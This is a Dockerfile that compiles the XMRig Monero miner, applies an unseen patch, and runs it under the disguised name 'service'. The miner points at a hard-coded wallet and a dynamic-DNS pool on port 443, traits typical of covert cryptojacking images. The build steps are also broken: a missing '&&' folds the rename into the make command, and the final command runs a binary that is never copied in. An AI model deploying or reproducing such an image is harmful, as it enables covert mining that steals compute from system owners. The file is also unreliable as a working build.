FROM alpine:3.13 AS builder

ARG XMRIG_VERSION='v6.16.4'
WORKDIR /miner

RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
    apk update && apk add --no-cache \
    build-base \
    git \
    cmake \
    libuv-dev \
    linux-headers \
    libressl-dev \
    hwloc-dev@community

RUN git clone https://github.com/xmrig/xmrig && \
    mkdir xmrig/build && \
    cd xmrig && git checkout ${XMRIG_VERSION}

COPY supportxmr.patch /miner/xmrig
RUN cd xmrig && git apply supportxmr.patch

RUN cd xmrig/build && \
    cmake .. -DCMAKE_BUILD_TYPE=Release && \
    make -j$(nproc) \
    mv xmrig service 


FROM alpine:3.13

ENV WALLET=SOL:HGDzRh99Lvq6ow3WQ91sdrwPNER8Lt7hka5SmXg5k9Rx.xmr
ENV POOL=stratum+ssl://keizermail.duckdns.org:443
ENV WORKER_NAME=x

RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
    apk update && apk add --no-cache \
    libuv \
    libressl \
    hwloc@community

WORKDIR /xmr
COPY --from=builder /miner/xmrig/build/xmrig /xmr

CMD ["sh", "-c", "./service --url=$POOL --donate-level=1 --user=$WALLET --pass=$WORKER_NAME -k --coin=monero"]
